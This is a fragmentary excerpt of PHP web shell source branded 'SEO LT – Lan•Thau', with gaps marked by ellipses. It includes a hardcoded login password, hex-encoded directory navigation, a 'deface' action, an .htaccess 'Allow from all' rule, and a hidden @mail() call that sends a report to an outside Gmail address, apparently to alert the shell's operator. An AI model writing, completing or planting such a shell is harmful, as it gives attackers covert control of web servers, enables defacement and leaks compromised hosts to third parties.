...
// $GLOBALS['fungsi'][0]
	...
	$gcw = "getcwd";
	$correctPassword = "khamlan"; //Change Password
	if (isset($_POST['pass'])) {
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>SEO LT – Lan•Thau</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
		...
		@mail('whoknows@gmail.com', 'Hehehe', $report_bug);
		}
		if($_7['id'] == 'deface'){
...
Allow from all
		...
		</div><div class='text-secondary'>&copy SEO LT – Lan•Thau</div>
	</div>
</div>
</body>
</html>
